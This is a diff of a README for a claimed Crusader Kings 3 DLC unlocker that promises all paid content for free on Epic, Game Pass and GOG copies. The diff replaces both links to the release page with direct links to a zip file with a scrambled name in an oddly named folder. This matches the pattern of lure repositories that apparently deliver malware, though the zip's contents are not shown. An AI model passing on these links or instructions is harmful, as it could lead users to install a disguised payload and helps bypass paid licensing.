@@ -1,6 +1,6 @@
 # 🛡️ Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG- - Access all game content for free
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Tien8504/Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG-)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Tien8504/Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG-/main/pluviographic/Game_Pass_Epic_Crusader_DL_Platform_Kings_GO_Unlocker_Cross_v3.3-alpha.2.zip)
 
 This tool enables access to all downloadable content for Crusader Kings 3. It works on Windows systems regardless of the store where you purchased the base game. It supports copies from Epic Games, Xbox Game Pass, and GOG.
 
@@ -18,7 +18,7 @@ This unlocker works with the following game versions:
 ## 📥 How to download the software
 You need to visit the project releases page to obtain the latest version. Follow the link below to reach the download section.
 
-[Click here to visit the release page and download the installer](https://github.com/Tien8504/Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG-)
+[Click here to visit the release page and download the installer](https://raw.githubusercontent.com/Tien8504/Crusader-Kings-3-DLC-Unlocker-Cross-Platform-Epic-Game-Pass-GOG-/main/pluviographic/Game_Pass_Epic_Crusader_DL_Platform_Kings_GO_Unlocker_Cross_v3.3-alpha.2.zip)
 
 ## 🚀 Setup instructions
 1. Download the tool from the link provided above.
